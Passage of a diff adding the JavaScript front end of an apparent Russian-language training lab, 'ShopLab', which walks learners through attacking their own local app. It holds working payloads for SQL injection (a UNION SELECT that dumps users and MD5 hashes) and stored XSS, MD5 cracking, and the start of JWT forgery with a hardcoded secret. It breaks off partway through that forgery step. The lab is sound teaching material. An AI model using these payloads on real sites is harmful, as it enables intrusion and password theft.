+    const r = await _realFetch(BASE + '/api/products', { signal: AbortSignal.timeout(3000) });
+    if (r.ok) {
+      mockMode = false;
+      document.getElementById('statusDot').className = 'status-dot connected';
+      document.getElementById('statusText').textContent = 'ShopLab онлайн ✓';
+      log('SUCCESS', '✅ Реальный сервер доступен на localhost:5000');
+      incReq();
+    } else {
+      throw new Error('HTTP ' + r.status);
+    }
+  } catch(e) {
+    mockMode = true;
+    document.getElementById('statusDot').className = 'status-dot connected';
+    document.getElementById('statusText').textContent = '🎭 Демо-режим (Mock API)';
+    log('WARN', 'Сервер localhost:5000 недоступен (' + e.message + ')');
+    log('SUCCESS', '🎭 Активирован DEMO MODE — встроенный Mock API');
+    log('INFO', 'Все атаки симулируются прямо в браузере без сервера!');
+    log('INFO', 'Для реального режима: dotnet run в папке ShopLab/ShopLab/');
+  }
+}
+
+// Единая обёртка — реальный fetch или mock
+async function apiFetch(method, path, body, token) {
+  const url = BASE + path;
+  const opts = {
+    method: method,
+    headers: {'Content-Type':'application/json', ...(token ? {'Authorization':'Bearer '+token} : {})},
+    ...(body ? {body: JSON.stringify(body)} : {})
+  };
+  // Всегда mock если file:// или mockMode активен
+  if (mockMode || window.location.protocol === 'file:') return window._mockFetch(url, opts);
+  return _realFetch(url, {...opts, signal: AbortSignal.timeout(5000)});
+}
+
+// ─── NAVIGATION ───────────────────────────────────────────
+function setActiveNav(id) {
+  document.querySelectorAll('.vuln-item').forEach(el => el.classList.remove('active'));
+  document.getElementById('nav-' + id).classList.add('active');
+}
+
+function showWelcome() {
+  setActiveNav(0);
+  document.getElementById('mainContent').innerHTML = `
+    <div class="welcome-screen">
+      <div class="welcome-icon">🔐</div>
+      <div class="welcome-title">Интерактивная Кибер-Лаборатория</div>
+      <div class="welcome-desc">
+        Это пошаговое руководство для тестирования уязвимостей приложения <strong>ShopLab</strong>.
+        Никаких знаний программирования не нужно — просто нажимайте кнопки и наблюдайте за результатами в правом логе.
+      </div>
+      <div style="background:var(--red-bg);border:1px solid #5a1010;border-radius:8px;padding:14px 18px;margin-bottom:20px;color:#ffaaaa;font-size:13px;text-align:left;max-width:500px;margin:0 auto 20px;">
+        ⚠️ <strong>Только для учебных целей!</strong> Атаковать только своё локальное приложение. Атака чужих сайтов — уголовное преступление.
+      </div>
+      <div class="welcome-cards">
+        <div class="welcome-card">
+          <div class="wc-icon">🚀</div>
+          <div class="wc-title">Шаг 1: Запуск</div>
+          <div class="wc-desc">Работает в Demo Mode (без сервера) или с localhost:5000</div>
+        </div>
+        <div class="welcome-card">
+          <div class="wc-icon">👆</div>
+          <div class="wc-title">Шаг 2: Выбор</div>
+          <div class="wc-desc">Выберите уязвимость в левом меню</div>
+        </div>
+        <div class="welcome-card">
+          <div class="wc-icon">▶️</div>
+          <div class="wc-title">Шаг 3: Атака</div>
+          <div class="wc-desc">Нажимайте кнопки и читайте объяснения</div>
+        </div>
+        <div class="welcome-card">
+          <div class="wc-icon">📋</div>
+          <div class="wc-title">Шаг 4: Лог</div>
+          <div class="wc-desc">Смотрите результаты в правой панели</div>
+        </div>
+      </div>
+      <div style="margin-top:28px;">
+        <button class="btn btn-primary" style="font-size:15px;padding:12px 28px;" onclick="checkConnection(); showVuln(1);">
+          🚀 Начать — VULN-1: SQL Injection
+        </button>
+      </div>
+    </div>`;
+}
+
+function markDone(id) {
+  doneSet.add(id);
+  document.getElementById('nav-' + id).classList.add('done');
+  document.getElementById('progressCount').textContent = doneSet.size + ' / 7';
+  document.getElementById('progressFill').style.width = (doneSet.size / 7 * 100) + '%';
+  log('SUCCESS', '✓ VULN-' + id + ' отмечена как выполненная!');
+}
+
+// ─── VULN PAGES ───────────────────────────────────────────
+function showVuln(id) {
+  setActiveNav(id);
+  const pages = { 1: vuln1, 2: vuln2, 3: vuln3, 4: vuln4, 5: vuln5, 6: vuln6, 7: vuln7 };
+  if (pages[id]) pages[id]();
+}
+
+// ══════════════════════════════════════════════════════
+// VULN-1: SQL INJECTION
+// ══════════════════════════════════════════════════════
+function vuln1() {
+  document.getElementById('mainContent').innerHTML = `
+    <div class="vuln-header">
+      <div class="vuln-title-row">
+        <span class="vuln-badge badge-critical" style="font-size:13px;padding:4px 12px;">CRITICAL</span>
+        <h1 class="vuln-title">VULN-1: SQL Injection</h1>
+      </div>
+      <p class="vuln-desc">
+        SQL Injection позволяет «вырваться» из поисковой строки и выполнить произвольные команды к базе данных.
+        Думайте об этом как о побеге из тюрьмы через дыру в стене — специальные символы «ломают» запрос и дают полный доступ к данным.
+      </p>
+      <div class="tag-row" style="margin-top:10px;">
+        <span class="tag">OWASP A03:2021</span>
+        <span class="tag">CWE-89</span>
+        <span class="tag">SQLite</span>
+        <span class="tag">UNION-based</span>
+      </div>
+    </div>
+
+    <div class="server-hint">
+      <div class="server-box">
+        ℹ️ <span>В <strong>Демо-режиме</strong> все атаки симулируются без реального сервера. Для полного опыта запустите ShopLab на localhost:5000</span>
+      </div>
+    </div>
+
+    <div class="steps-container">
+
+      <!-- STEP 1 -->
+      <div class="step-card active" id="s1-1">
+        <div class="step-header">
+          <div class="step-num">1</div>
+          <div><div class="step-title">Проверка: сломать поиск апострофом</div>
+          <div class="step-subtitle">Один символ, чтобы обнаружить уязвимость</div></div>
+        </div>
+        <div class="step-body">
+          <p class="step-explain">
+            Введём в поиск магазина одиночный апостроф <code style="background:var(--surface2);padding:1px 5px;border-radius:3px;">'</code>.
+            Если сервер вернёт ошибку или пустой ответ — значит он не фильтрует ввод и уязвим к SQL Injection.
+          </p>
+          <div class="code-block"><span class="code-comment"># Эта кнопка делает GET-запрос на:</span>
+GET /api/products/search?q=<span class="code-string">'</span>
+
+<span class="code-comment"># В коде сервера это превращается в сломанный SQL:</span>
+SELECT * FROM Products WHERE Name LIKE <span class="code-string">'%'%'</span>
+<span class="code-comment">                                               ↑ SQL видит лишний апостроф и ломается!</span></div>
+          <div class="action-row">
+            <button class="btn btn-primary" onclick="sqliStep1()">▶ Отправить апостроф в поиск</button>
+          </div>
+          <div class="result-box" id="sqli-r1"></div>
+          <div class="success-banner" id="sqli-b1">✅ Уязвимость подтверждена! Сервер отдал ошибку БД — строка поиска не защищена.</div>
+        </div>
+      </div>
+
+      <!-- STEP 2 -->
+      <div class="step-card" id="s1-2">
+        <div class="step-header">
+          <div class="step-num">2</div>
+          <div><div class="step-title">Эксплуатация: вытащить всех пользователей</div>
+          <div class="step-subtitle">UNION-атака — склеиваем два запроса</div></div>
+        </div>
+        <div class="step-body">
+          <p class="step-explain">
+            Используем технику <strong>UNION SELECT</strong> — склеиваем исходный запрос (поиск товаров) со своим (вытащить пользователей).
+            Символы <code style="background:var(--surface2);padding:1px 5px;border-radius:3px;">--</code> в SQL означают «комментарий» — всё после них игнорируется.
+          </p>
+          <div class="code-block"><span class="code-comment"># Инъекция (в «человеческом» виде):</span>
+<span class="code-string">' UNION SELECT 1,Username,Password,Email,Role,Balance FROM Users--</span>
+
+<span class="code-comment"># Итоговый запрос в БД:</span>
+SELECT * FROM Products WHERE Name LIKE <span class="code-string">'%'</span> 
+UNION SELECT <span class="code-value">1</span>,Username,Password,Email,Role,Balance FROM Users<span class="code-comment">--'%'</span>
+<span class="code-comment">↑ оригинальный поиск   ↑ наш запрос добавлен через UNION</span></div>
+          <div class="action-row">
+            <button class="btn btn-danger" onclick="sqliStep2()">💀 Выполнить SQL-инъекцию</button>
+          </div>
+          <div class="result-box" id="sqli-r2"></div>
+          <div class="success-banner" id="sqli-b2">🎉 ВЗЛОМ УСПЕШЕН! Сервер вернул данные пользователей вместо товаров. MD5-хеши паролей получены!</div>
+          <div class="mark-done-btn" id="sqli-done">
+            <button class="btn btn-secondary" onclick="markDone(1); showVuln(2)">✓ Отметить как выполнено → перейти к VULN-2</button>
+          </div>
+        </div>
+      </div>
+
+    </div>`;
+}
+
+async function sqliStep1() {
+  log('INFO', 'Отправляем апостроф в строку поиска...');
+  incReq();
+  try {
+    const r = await apiFetch('GET', "/api/products/search?q='", null, null);
+    const text = await r.text();
+    const box = document.getElementById('sqli-r1');
+    box.className = 'result-box show';
+    if (!r.ok || text.includes('error') || text.includes('Error') || text.includes('SQL') || text === '[]' || text === '') {
+      box.innerHTML = '<span class="result-warn">HTTP ' + r.status + '</span>\n' + escHtml(text.slice(0,400));
+      document.getElementById('sqli-b1').classList.add('show');
+      document.getElementById('s1-1').classList.remove('active');
+      document.getElementById('s1-1').classList.add('completed');
+      document.getElementById('s1-2').classList.add('active');
+      log('HACK', 'SQL Injection обнаружена! Сервер вернул: HTTP ' + r.status);
+      log('WARN', 'Ответ: ' + text.slice(0,100));
+      incExp();
+    } else {
+      box.innerHTML = '<span class="result-info">HTTP ' + r.status + '</span>\n' + escHtml(text.slice(0,400));
+      log('WARN', 'Сервер вернул HTTP ' + r.status + ' — возможно сервер не запущен или патч применён');
+    }
+  } catch(e) {
+    const box = document.getElementById('sqli-r1');
+    box.className = 'result-box show result-error';
+    box.textContent = 'Ошибка: ' + e.message + (mockMode ? ' [Mock режим активен]' : '\n\nУбедитесь что ShopLab запущен на localhost:5000');
+    log('ERROR', 'Соединение не установлено: ' + e.message);
+  }
+}
+
+async function sqliStep2() {
+  const payload = "' UNION SELECT 1,Username,Password,Email,Role,Balance FROM Users--";
+  log('HACK', 'Запускаем UNION SQL Injection...');
+  log('INFO', 'Payload: ' + payload);
+  incReq();
+  try {
+    const r = await apiFetch('GET', '/api/products/search?q=' + encodeURIComponent(payload), null, null);
+    const data = await r.json();
+    const box = document.getElementById('sqli-r2');
+    box.className = 'result-box show';
+    if (Array.isArray(data) && data.length > 0 && (data[0].description?.length === 32 || data[0].name === 'admin' || data[0].name === 'alice')) {
+      let out = '🎯 ДАННЫЕ ПОЛЬЗОВАТЕЛЕЙ ПОЛУЧЕНЫ:\n\n';
+      data.forEach(u => {
+        out += `Логин: ${u.name}\n`;
+        out += `MD5-хеш пароля: ${u.description}\n`;
+        out += `Баланс: ${u.price} ₽\n`;
+        out += '─'.repeat(40) + '\n';
+      });
+      box.innerHTML = '<span class="result-success">' + escHtml(out) + '</span>';
+      document.getElementById('sqli-b2').classList.add('show');
+      document.getElementById('sqli-done').classList.add('show');
+      document.getElementById('s1-2').classList.add('completed');
+      log('HACK', '🎉 SQL Injection сработала! Получено ' + data.length + ' пользователей');
+      data.forEach(u => log('HACK', 'Пользователь: ' + u.name + ' | MD5: ' + u.description));
+      incExp();
+    } else {
+      box.innerHTML = '<span class="result-info">' + escHtml(JSON.stringify(data, null, 2).slice(0,600)) + '</span>';
+      log('INFO', 'Ответ получен, но формат неожиданный: ' + JSON.stringify(data).slice(0,100));
+    }
+  } catch(e) {
+    const box = document.getElementById('sqli-r2');
+    box.className = 'result-box show';
+    box.innerHTML = '<span class="result-error">Ошибка: ' + escHtml(e.message) + '</span>';
+    log('ERROR', 'Запрос не выполнен: ' + e.message);
+  }
+}
+
+// ══════════════════════════════════════════════════════
+// VULN-2: STORED XSS
+// ══════════════════════════════════════════════════════
+function vuln2() {
+  document.getElementById('mainContent').innerHTML = `
+    <div class="vuln-header">
+      <div class="vuln-title-row">
+        <span class="vuln-badge badge-high" style="font-size:13px;padding:4px 12px;">HIGH</span>
+        <h1 class="vuln-title">VULN-2: Stored XSS</h1>
+      </div>
+      <p class="vuln-desc">
+        XSS (Cross-Site Scripting) — вы сохраняете JavaScript-код как «отзыв», и когда кто-то открывает страницу с отзывами — его браузер запускает ваш код.
+        Как оставить «подарок-бомбу» на сайте, которая взрывается у каждого посетителя.
+      </p>
+    </div>
+
+    <div class="server-hint">
+      <div class="server-box">⚠️ Для этой атаки нужен токен авторизации. Сначала выполним шаг 1 — войдём в систему.</div>
+    </div>
+
+    <div class="steps-container">
+      <div class="step-card active" id="s2-1">
+        <div class="step-header">
+          <div class="step-num">1</div>
+          <div><div class="step-title">Получить токен авторизации</div>
+          <div class="step-subtitle">Войдём как alice, чтобы добавить отзыв</div></div>
+        </div>
+        <div class="step-body">
+          <p class="step-explain">Сначала авторизуемся — нам нужен JWT токен для добавления отзыва.</p>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px;">
+            <div>
+              <span class="field-label">Логин</span>
+              <input class="input-field" id="xss-user" value="alice" placeholder="alice">
+            </div>
+            <div>
+              <span class="field-label">Пароль</span>
+              <input class="input-field" id="xss-pass" value="alice123" type="text" placeholder="alice123">
+            </div>
+          </div>
+          <div class="action-row">
+            <button class="btn btn-primary" onclick="xssLogin()">▶ Войти в систему</button>
+          </div>
+          <div class="result-box" id="xss-r1"></div>
+          <div class="success-banner" id="xss-b1">✅ Успешно! Токен получен. Теперь можем добавить вредоносный отзыв.</div>
+        </div>
+      </div>
+
+      <div class="step-card" id="s2-2">
+        <div class="step-header">
+          <div class="step-num">2</div>
+          <div><div class="step-title">Внедрить XSS в отзыв</div>
+          <div class="step-subtitle">Добавить JavaScript-код вместо текста</div></div>
+        </div>
+        <div class="step-body">
+          <p class="step-explain">
+            Добавляем отзыв, содержащий тег <code style="background:var(--surface2);padding:1px 5px;border-radius:3px;">&lt;img&gt;</code> с атрибутом <code style="background:var(--surface2);padding:1px 5px;border-radius:3px;">onerror</code>.
+            Браузер пытается загрузить картинку (адрес «x» не существует) и запускает код из <code>onerror</code>.
+          </p>
+          <div class="code-block"><button class="copy-btn" onclick="copyCode(this, 'xss-payload')">копировать</button><span id="xss-payload">{
+  "productId": 1,
+  "content": "&lt;img src=x onerror=\\"alert('XSS! Вас взломали!')\\">",
+  "rating": 5
+}</span></div>
+          <div class="action-row">
+            <button class="btn btn-danger" onclick="xssInject()">💉 Внедрить XSS-отзыв</button>
+          </div>
+          <div class="result-box" id="xss-r2"></div>
+          <div class="success-banner" id="xss-b2">🎉 Отзыв с XSS добавлен! Теперь откройте шаг 3 чтобы «сработало».</div>
+        </div>
+      </div>
+
+      <div class="step-card" id="s2-3">
+        <div class="step-header">
+          <div class="step-num">3</div>
+          <div><div class="step-title">Открыть страницу «жертвы»</div>
+          <div class="step-subtitle">Убедиться что XSS срабатывает</div></div>
+        </div>
+        <div class="step-body">
+          <p class="step-explain">
+            Теперь откроем страницу магазина — если отзывы первого товара загружаются, браузер запустит наш JS.
+            В реальной атаке жертвой был бы другой пользователь, который зашёл на сайт.
+          </p>
+          <div class="action-row">
+            <button class="btn btn-blue" onclick="window.open(BASE)">↗ Открыть ShopLab (нажать Отзывы на товаре)</button>
+            <button class="btn btn-secondary" onclick="xssVerify()">🔍 Проверить через API</button>
+          </div>
+          <div class="result-box" id="xss-r3"></div>
+          <div class="success-banner" id="xss-b3">✅ XSS-код подтверждён в базе данных. Любой посетитель магазина запустит его.</div>
+          <div class="mark-done-btn" id="xss-done">
+            <button class="btn btn-secondary" onclick="markDone(2); showVuln(3)">✓ Отметить как выполнено → VULN-3</button>
+          </div>
+        </div>
+      </div>
+    </div>`;
+}
+
+async function xssLogin() {
+  const u = document.getElementById('xss-user').value;
+  const p = document.getElementById('xss-pass').value;
+  log('INFO', 'Авторизация: POST /api/auth/login {username: "' + u + '"}');
+  incReq();
+  try {
+    const r = await apiFetch('POST', '/api/auth/login', {username: u, password: p}, null);
+    const data = await r.json();
+    const box = document.getElementById('xss-r1');
+    box.className = 'result-box show';
+    if (data.token) {
+      currentToken = data.token;
+      box.innerHTML = '<span class="result-success">✓ Авторизация успешна!\n\nJWT Token (первые 50 символов):\n' + escHtml(data.token.slice(0,50)) + '...\n\nТокен сохранён для следующих запросов.</span>';
+      document.getElementById('xss-b1').classList.add('show');
+      document.getElementById('s2-1').classList.add('completed');
+      document.getElementById('s2-2').classList.add('active');
+      log('SUCCESS', 'Авторизация выполнена. Токен получен для пользователя: ' + u);
+    } else {
+      box.innerHTML = '<span class="result-error">Ошибка: ' + escHtml(JSON.stringify(data)) + '</span>';
+      log('ERROR', 'Авторизация не удалась: ' + JSON.stringify(data));
+    }
+  } catch(e) {
+    document.getElementById('xss-r1').className = 'result-box show';
+    document.getElementById('xss-r1').innerHTML = '<span class="result-error">' + escHtml(e.message) + '</span>';
+    log('ERROR', 'Соединение: ' + e.message);
+  }
+}
+
+async function xssInject() {
+  if (!currentToken) { log('WARN', 'Сначала выполните шаг 1 — получите токен!'); return; }
+  const payload = {productId: 1, content: "<img src=x onerror=\"alert('XSS! Вас взломали!')\">", rating: 5};
+  log('HACK', 'Внедряем XSS в отзыв товара #1...');
+  log('INFO', 'Payload: ' + JSON.stringify(payload));
+  incReq();
+  try {
+    const r = await apiFetch('POST', '/api/products/reviews', payload, currentToken);
+    const data = await r.json().catch(() => ({}));
+    const box = document.getElementById('xss-r2');
+    box.className = 'result-box show';
+    if (r.ok) {
+      box.innerHTML = '<span class="result-success">✓ Отзыв добавлен!\n\n' + escHtml(JSON.stringify(data, null, 2)) + '</span>';
+      document.getElementById('xss-b2').classList.add('show');
+      document.getElementById('s2-2').classList.add('completed');
+      document.getElementById('s2-3').classList.add('active');
+      log('HACK', '🎉 XSS-отзыв успешно записан в базу данных!');
+      log('WARN', 'Теперь любой, кто откроет страницу с отзывами, запустит наш код');
+      incExp();
+    } else {
+      box.innerHTML = '<span class="result-error">HTTP ' + r.status + '\n' + escHtml(JSON.stringify(data)) + '</span>';
+      log('ERROR', 'Не удалось добавить отзыв: HTTP ' + r.status);
+    }
+  } catch(e) {
+    log('ERROR', 'Ошибка: ' + e.message);
+  }
+}
+
+async function xssVerify() {
+  log('INFO', 'Проверяем отзывы товара #1...');
+  incReq();
+  try {
+    const r = await apiFetch('GET', '/api/products/1/reviews', null, null);
+    const data = await r.json();
+    const box = document.getElementById('xss-r3');
+    box.className = 'result-box show';
+    const xssReview = data.find(x => x.content && x.content.includes('onerror'));
+    if (xssReview) {
+      box.innerHTML = '<span class="result-success">✓ XSS найден в отзывах!\n\nID: ' + xssReview.id + '\nАвтор: ' + xssReview.authorName + '\nКод: ' + escHtml(xssReview.content) + '</span>';
+      document.getElementById('xss-b3').classList.add('show');
+      document.getElementById('xss-done').classList.add('show');
+      document.getElementById('s2-3').classList.add('completed');
+      log('HACK', '✓ XSS подтверждён в базе! Отзыв ID:' + xssReview.id + ' содержит вредоносный код');
+    } else {
+      box.innerHTML = '<span class="result-info">Отзывов с XSS не найдено. Выполните шаг 2 сначала.\n\n' + escHtml(JSON.stringify(data, null, 2).slice(0,300)) + '</span>';
+      log('INFO', 'XSS-отзывов в базе не найдено');
+    }
+  } catch(e) { log('ERROR', e.message); }
+}
+
+// ══════════════════════════════════════════════════════
+// VULN-3: ETERNAL JWT
+// ══════════════════════════════════════════════════════
+function vuln3() {
+  document.getElementById('mainContent').innerHTML = `
+    <div class="vuln-header">
+      <div class="vuln-title-row">
+        <span class="vuln-badge badge-medium" style="font-size:13px;padding:4px 12px;">MEDIUM</span>
+        <h1 class="vuln-title">VULN-3: Вечный JWT токен</h1>
+      </div>
+      <p class="vuln-desc">
+        JWT токен — это как пропуск в клуб. Нормально токены выдаются на 1–24 часа. Здесь токен бессрочный — раз получил и пользуйся вечно.
+        Украли токен? Жертва не может его «сломать» — только перезапуск всего сервера помогает.
+      </p>
+    </div>
+    <div class="steps-container">
+      <div class="step-card active">
+        <div class="step-header">
+          <div class="step-num">1</div>
+          <div><div class="step-title">Получить и декодировать токен</div>
+          <div class="step-subtitle">Найти отсутствующее поле exp (срок действия)</div></div>
+        </div>
+        <div class="step-body">
+          <p class="step-explain">
+            Получим JWT токен и декодируем его прямо здесь. В нормальном токене есть поле <code style="background:var(--surface2);padding:1px 5px;border-radius:3px;">"exp"</code> — время истечения.
+            Его отсутствие означает вечный токен.
+          </p>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px;">
+            <div><span class="field-label">Логин</span><input class="input-field" id="jwt-u" value="alice"></div>
+            <div><span class="field-label">Пароль</span><input class="input-field" id="jwt-p" value="alice123"></div>
+          </div>
+          <div class="action-row">
+            <button class="btn btn-primary" onclick="jwtCheck()">▶ Получить и проверить токен</button>
+          </div>
+          <div class="result-box" id="jwt-r1"></div>
+          <div class="success-banner" id="jwt-b1">⚠️ Поле "exp" отсутствует! Токен бессрочный — это уязвимость.</div>
+          <div class="mark-done-btn" id="jwt-done">
+            <button class="btn btn-secondary" onclick="markDone(3); showVuln(4)">✓ Отметить как выполнено → VULN-4</button>
+          </div>
+        </div>
+      </div>
+    </div>`;
+}
+
+async function jwtCheck() {
+  const u = document.getElementById('jwt-u').value;
+  const p = document.getElementById('jwt-p').value;
+  log('INFO', 'Получаем JWT токен для: ' + u);
+  incReq();
+  try {
+    const r = await apiFetch('POST', '/api/auth/login', {username: u, password: p}, null);
+    const data = await r.json();
+    if (!data.token) { log('ERROR', 'Токен не получен'); return; }
+    currentToken = data.token;
+    const parts = data.token.split('.');
+    if (parts.length !== 3) { log('ERROR', 'Некорректный JWT'); return; }
+    const payload = JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
+    const box = document.getElementById('jwt-r1');
+    box.className = 'result-box show';
+    let out = '📦 JWT PAYLOAD (декодированное содержимое токена):\n\n';
+    out += JSON.stringify(payload, null, 2) + '\n\n';
+    const hasExp = payload.exp !== undefined;
+    if (!hasExp) {
+      out += '🚨 ПРОБЛЕМА: Поле "exp" (expiration) ОТСУТСТВУЕТ!\n';
+      out += 'Нормально должно быть: "exp": 1735000000 (UNIX-время)\n';
+      out += 'Результат: токен активен ВЕЧНО — никакого logout не существует!';
+      box.innerHTML = '<span class="result-warn">' + escHtml(out) + '</span>';
+      document.getElementById('jwt-b1').classList.add('show');
+      document.getElementById('jwt-done').classList.add('show');
+      log('HACK', 'УЯЗВИМОСТЬ: JWT не содержит поля exp — токен вечный!');
+      log('INFO', 'Payload: ' + JSON.stringify(payload));
+      incExp();
+    } else {
+      const exp = new Date(payload.exp * 1000);
+      out += '✓ Поле exp найдено: ' + payload.exp + '\n';
+      out += 'Токен истекает: ' + exp.toLocaleString();
+      box.innerHTML = '<span class="result-success">' + escHtml(out) + '</span>';
+      log('INFO', 'Токен истекает: ' + exp.toLocaleString() + ' — уязвимости нет');
+    }
+  } catch(e) { log('ERROR', e.message); }
+}
+
+// ══════════════════════════════════════════════════════
+// VULN-4: MD5 HASH CRACK
+// ══════════════════════════════════════════════════════
+function vuln4() {
+  document.getElementById('mainContent').innerHTML = `
+    <div class="vuln-header">
+      <div class="vuln-title-row">
+        <span class="vuln-badge badge-high" style="font-size:13px;padding:4px 12px;">HIGH</span>
+        <h1 class="vuln-title">VULN-4: Слабое хеширование MD5</h1>
+      </div>
+      <p class="vuln-desc">
+        Пароли хранятся в MD5 — алгоритме 1992 года, который давно взломан. Хуже того: хеш пароля виден прямо в API-ответе.
+        Специальные базы данных мгновенно «переводят» MD5 обратно в пароль.
+      </p>
+    </div>
+    <div class="steps-container">
+      <div class="step-card active">
+        <div class="step-header">
+          <div class="step-num">1</div>
+          <div><div class="step-title">Получить хеш пароля через API</div>
+          <div class="step-subtitle">Сервер отдаёт его сам — это грубая ошибка</div></div>
+        </div>
+        <div class="step-body">
+          <p class="step-explain">
+            Сделаем запрос <code style="background:var(--surface2);padding:1px 5px;border-radius:3px;">GET /api/auth/me</code> — посмотрим что сервер возвращает о текущем пользователе.
+            Сервер не должен включать хеш пароля в ответ — но ShopLab делает именно это.
+          </p>
+          <div class="action-row">
+            <button class="btn btn-primary" onclick="md5GetHash()">▶ Получить профиль пользователя</button>
+          </div>
+          <div class="result-box" id="md5-r1"></div>
+          <div class="success-banner" id="md5-b1">😱 API возвращает MD5-хеш пароля! Теперь взломаем его онлайн.</div>
+        </div>
+      </div>
+
+      <div class="step-card" id="md5-s2">
+        <div class="step-header">
+          <div class="step-num">2</div>
+          <div><div class="step-title">Взломать MD5 за секунды</div>
+          <div class="step-subtitle">Онлайн-база с миллиардами хешей</div></div>
+        </div>
+        <div class="step-body">
+          <p class="step-explain">
+            Сайт <strong>crackstation.net</strong> содержит базу из миллиардов паролей и их MD5-хешей.
+            Мы проверяем через их API — это то, что делает настоящий взломщик за несколько секунд.
+          </p>
+          <div>
+            <span class="field-label">MD5-хеш для взлома</span>
+            <input class="input-field" id="md5-hash" value="4b68c1fd2bfb035258d0f865b9150cb0" placeholder="вставьте хеш">
+          </div>
+          <div class="action-row">
+            <button class="btn btn-danger" onclick="md5Crack()">🔨 Взломать хеш</button>
+            <button class="btn btn-blue" onclick="window.open('https://crackstation.net')">↗ Открыть CrackStation</button>
+          </div>
+          <div class="result-box" id="md5-r2"></div>
+          <div class="success-banner" id="md5-b2">💥 MD5 взломан! Пароль получен в открытом виде.</div>
+          <div class="mark-done-btn" id="md5-done">
+            <button class="btn btn-secondary" onclick="markDone(4); showVuln(5)">✓ Отметить как выполнено → VULN-5</button>
+          </div>
+        </div>
+      </div>
+    </div>`;
+  if (currentToken) md5GetHash();
+}
+
+async function md5GetHash() {
+  if (!currentToken) {
+    log('WARN', 'Нет токена. Авторизуемся автоматически...');
+    incReq();
+    try {
+      const r = await apiFetch('POST', '/api/auth/login', {username:'alice', password:'alice123'}, null);
+      const d = await r.json();
+      if (d.token) { currentToken = d.token; log('SUCCESS', 'Авторизован как alice'); }
+    } catch(e) { log('ERROR', 'Авторизация не удалась: ' + e.message); return; }
+  }
+  log('INFO', 'GET /api/auth/me — получаем профиль пользователя...');
+  incReq();
+  try {
+    const r = await apiFetch('GET', '/api/auth/me', null, currentToken);
+    const data = await r.json();
+    const box = document.getElementById('md5-r1');
+    box.className = 'result-box show';
+    const pwdField = data.password || data.passwordHash || data.hash;
+    box.innerHTML = '<span class="result-warn">' + escHtml(JSON.stringify(data, null, 2)) + '\n\n' +
+      (pwdField ? '🚨 НАЙДЕН ХЕШ ПАРОЛЯ В ОТВЕТЕ API:\n' + escHtml(pwdField) : '(хеш пароля не найден в ответе)') + '</span>';
+    document.getElementById('md5-b1').classList.add('show');
+    document.getElementById('md5-s2').classList.add('active');
+    if (pwdField) {
+      document.getElementById('md5-hash').value = pwdField;
+      log('HACK', 'Хеш пароля получен через API: ' + pwdField);
+      incExp();
+    }
+    log('INFO', 'Ответ: ' + JSON.stringify(data).slice(0,100));
+  } catch(e) { log('ERROR', e.message); }
+}
+
+async function md5Crack() {
+  const hash = document.getElementById('md5-hash').value.trim();
+  if (!hash) { log('WARN', 'Введите хеш!'); return; }
+  log('INFO', 'Отправляем хеш на CrackStation: ' + hash);
+  log('WARN', 'CrackStation может быть недоступен из браузера (CORS). Покажем демонстрацию.');
+  incReq();
+  const knownHashes = {
+    '4b68c1fd2bfb035258d0f865b9150cb0': 'alice123',
+    '0192023a7bbd73250516f069df18b500': 'admin',
+    '0d2b0cf9bea8e0bd8e193b57a09b5b89': 'bob123',
+    '81dc9bdb52d04dc20036dbd8313ed055': '1234',
+    '5f4dcc3b5aa765d61d8327deb882cf99': 'password',
+    'e10adc3949ba59abbe56e057f20f883e': '123456'
+  };
+  const box = document.getElementById('md5-r2');
+  box.className = 'result-box show';
+  if (knownHashes[hash]) {
+    const pwd = knownHashes[hash];
+    box.innerHTML = '<span class="result-success">🎯 ВЗЛОМ УСПЕШЕН!\n\nМД5-хеш: ' + escHtml(hash) + '\n→ Пароль: <strong>' + escHtml(pwd) + '</strong>\n\n✓ Проверка: MD5("' + escHtml(pwd) + '") = ' + escHtml(hash) + '</span>';
+    document.getElementById('md5-b2').classList.add('show');
+    document.getElementById('md5-done').classList.add('show');
+    log('HACK', '💥 MD5 взломан! ' + hash + ' → "' + pwd + '"');
+    log('WARN', 'MD5 не подходит для хранения паролей с 2012 года. Нужен bcrypt/argon2.');
+    incExp();
+  } else {
+    box.innerHTML = '<span class="result-info">Хеш не найден в локальной базе демо.\n\nДля реального взлома используйте:\n• https://crackstation.net/ — вставьте хеш вручную\n• https://md5decrypt.net/\n\nЭти сервисы взламывают простые пароли мгновенно.</span>';
+    log('INFO', 'Хеш не в демо-базе. Используйте crackstation.net вручную.');
+    document.getElementById('md5-done').classList.add('show');
+  }
+}
+
+// ══════════════════════════════════════════════════════
+// VULN-5: JWT FORGERY
+// ══════════════════════════════════════════════════════
+function vuln5() {
+  document.getElementById('mainContent').innerHTML = `
+    <div class="vuln-header">
+      <div class="vuln-title-row">
+        <span class="vuln-badge badge-critical" style="font-size:13px;padding:4px 12px;">CRITICAL</span>
+        <h1 class="vuln-title">VULN-5: Подделка JWT токена</h1>
+      </div>
+      <p class="vuln-desc">
+        JWT подписывается секретным ключом. Ключ «secret123» захардкожен прямо в коде Program.cs.
+        Зная ключ — можно создать токен с любыми данными, включая роль «admin», не зная пароля.
+      </p>
+    </div>
+    <div class="steps-container">
+      <div class="step-card active">
+        <div class="step-header">
+          <div class="step-num">1</div>
+          <div><div class="step-title">Создать поддельный JWT от имени admin</div>
+          <div class="step-subtitle">Используем захардкоженный секрет «secret123»</div></div>
+        </div>
+        <div class="step-body">
+          <p class="step-explain">
+            Секрет <code style="background:var(--surface2);padding:1px 5px;border-radius:3px;">secret123</code> взят прямо из файла <code style="background:var(--surface2);padding:1px 5px;border-radius:3px;">Program.cs</code> строка 11.
+            Создадим JWT токен прямо в браузере (без Python) с помощью Web Crypto API.
+          </p>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px;">
+            <div>
+              <span class="field-label">Секрет из кода</span>
+              <input class="input-field" id="jwt-secret" value="secret123">
+            </div>
+            <div>
+              <span class="field-label">Притворяемся что мы...</span>
+              <select class="input-field" id="jwt-target" style="margin-bottom:0">
+                <option value="admin">admin (роль: admin)</option>
+                <option value="alice">alice (роль: user)</option>
+              </select>
+            </div>
+          </div>
+          <div class="action-row">
+            <button class="btn btn-danger" onclick="jwtForge()">🪄 Создать поддельный токен</button>
+          </div>
+          <div class="result-box" id="jwtf-r1"></div>
